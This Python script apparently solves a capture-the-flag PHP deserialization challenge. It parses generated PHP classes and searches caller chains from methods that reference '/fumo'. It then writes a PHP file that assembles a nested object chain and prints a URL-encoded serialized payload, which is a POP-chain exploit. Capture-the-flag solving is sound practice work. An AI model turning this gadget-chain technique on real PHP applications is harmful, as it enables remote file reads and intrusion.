import re
class PhpFunc:
    def __init__(self, code:str) -> None:
        self.public = code[:code.index('function')].strip()
        self.name = code[code.index('function')+8 : code.index('{', code.index('function')+8)].strip()
        self.content = code[code.index('{')+1 : code.rindex('}')]
        pass
    def get_method_name(self) -> str:
        return self.name[:self.name.index('(')]
    def has_fumo(self) -> bool:
        if self.content.find('/fumo') >= 0:
            return True
        return False
    def has_some_word_in_content(self, word) -> bool:
        if self.content.find(word) >= 0:
            return True
        return False
    def show(self):
        print(f'{self.public} function {self.name}', '{')
        print(self.content)
        print('}')
    def __str__(self) -> str:
        res = ''
        res += f'{self.public} function {self.name}' + '{'
        res += self.content
        res += '}'
        return res

class PhpClass:
    def __init__(self, name, objs, func) -> None:
        self.name = name
        self.objs = objs
        self.func = func
        pass
    def __str__(self) -> str:
        objs = ''
        for o in self.objs:
            objs += f'public object {o};\n'
        res = f'''
        class {self.name} {{
            {objs}
            {self.func}
        }}
        '''
        res = f"class {self.name}" + '{\n'
        res += objs
        res += str(self.func) + '\n'
        res += '}'
        return res
    def find_calls(self):
        f = self.func
        c = f.content
        calls = []
        while 1:
            try:
                call = c[c.index('is_callable(')+12 : c.index(')', c.index('is_callable(')+12)].strip('[]')
                calls.append(call)
                c = c[c.index(')', c.index('is_callable(')+12):]
            except ValueError:
                if calls:
                    break
                return None
        return calls
    def is_end(self):
        if self.func.content.find('readfile') >= 0:
            return True
        return False
    def has_crypt(self):
        if self.func.content.find('crypt') >= 0:
            return True
        if self.func.content.find('md5') >= 0:
            return True
        if self.func.content.find('sha1') >= 0:
            return True
        # if self.func.content.find('=>') >= 0:
        # return True
        # if self.func.content.find('base64_encode') >= 0:
        # return True
        ans = re.findall("\@\$(\w+) = \$(\w+)",self.func.content)
        if len(ans) == 1 and len(ans[0]) == 2 and ans[0][0] != ans[0][1]:
            return True
        return False

def parse_a_class(code:str):
    name = code[code.index('class')+5 : code.index('{', code.index('class')+5)].strip()
    code = code[code.index('{')+1:code.rindex('}')].strip()
    objs = []
    while 1:
        try:
            obj = code[code.index('object')+6 : code.index(';', code.index('object')+6)].strip()
            objs.append(obj)
            code = code[code.index(';')+1:].strip()
        except ValueError:
            break
    f = PhpFunc(code)
    # f.show()
    c = PhpClass(name, objs, f)
    return c

def parse_classes():
    src = open('class.code', 'r').read()[:-1]
    codes = src.split('class')[1:]
    codes = [('class'+ src).strip() for src in codes]
    classes = []
    for c in codes:
        classes.append(parse_a_class(c))
    return classes

classes = parse_classes()
print("total node:", len(classes))

def find_a_class_by_name(name):
    res = []
    for c in classes:
        if c.name == name:
            res.append(c)
        try:
            assert len(res) == 1
            return res[0]
        except:
            print(len(res))

def find_leaves():
    res = []
    for c in classes:
        if c.func.has_fumo():
            res.append(c)
    return res

leaves = find_leaves()
print('fumo:', len(leaves))

def find_dad(child:PhpClass, dads=False):
    res = []
    method = child.func.get_method_name()
# print(method)
    for c in classes:
        if c.func.has_some_word_in_content(method):
            res.append(c)
    if dads:
        return res
    try:
        assert len(res) <= 1
    except AssertionError:
    # print('odd class:', child.name)
        return "fuck"
    if len(res) == 0:
        return None
    return res[0]

def find_root(c:PhpClass, end=None):
    path = []
    while 1:
        path.append(c.name)
        if end and c.name == end:
        # print('end', c.name)
            return path
        dad = find_dad(c)
        if not dad:
            break
        if dad == 'fuck':
        # print('odd child', c.name, end)
            return "fuck"
        c = dad
    return path

def find_all_path(leaves:list, end=None):
    odd = []
    res = []
    for fumo in leaves:
        path = find_root(fumo, end=end)
        if path == 'fuck':
            odd.append(fumo.name)
            continue
        root = find_a_class_by_name(path[-1])
        if root.func.get_method_name().find('__call') >= 0:
            continue
        # print(path)
        if end and root.name == end:
            print('find end:', path)
            res.append(path)
            continue
        if root.func.get_method_name().find('__destruct') >= 0:
            print('find __destruct:', path)
    # break
    print(odd)
    print(len(odd))
    return res
# odd = find_a_class_by_name('NG80OOTX1')
# leaves = find_dad(odd, dads=True)
# print(len(leaves))
# find_all_path(leaves)
# AIO6gEU36Z Z934iYzb8L
def write_paths():
    paths = find_all_path(leaves, end='NG80OOTX1')
    outfile = open('paths.txt', 'w')
    for p in paths:
        p.append('PskgfW')
        has_crypt = False
        for c_name in p:
            c = find_a_class_by_name(c_name)
            if c.has_crypt():
                print('has_encrypt!')
                has_crypt = True
                break
            if has_crypt:
                continue
            print(p, file=outfile)
            print('', file=outfile)
        outfile.close()
        
def get_exp(path):
    gods = path
    lines = []
    for i in range(len(gods)):
        c = find_a_class_by_name(gods[i])
        lines.append(f'$o{i} = new {c.name}();')
        if i == 0:
            for obj in c.objs:
                obj_name = obj.split('$')[-1]
                lines.append(f'$o{i}->{obj_name} = new \Error();')
            continue
        for obj in c.objs:
            obj_name = obj.split('$')[-1]
            lines.append(f'$o{i}->{obj_name} = $o{i-1};')
    lines.append(f'echo urlencode(serialize($o{len(gods)-1}));')
    return lines

def write_exp(path:list, fname='exp2.php'):
    outfile = open(fname, 'w')
    outfile.write('<?php\nnamespace christmasTree {\n')
    for i in range(len(path)):
        c = find_a_class_by_name(path[::-1][i])
        print(c, file=outfile)
    print('', file=outfile)
    exp = get_exp(path)
    for line in exp:
        print(line, file=outfile)
    outfile.write('}\n?>')
    outfile.close()

path = ['OBPbFX7nY', 'Qmi1DPR2K', 'OgtXPldp8y', 'E8MwbxHU', 'tXZK1Clc', 'Gbyt4gH', 'OfYkq75', 'yauiGx', 'GTVK7fsVG', 'NG80OOTX1', 'PskgfW']
write_exp(path)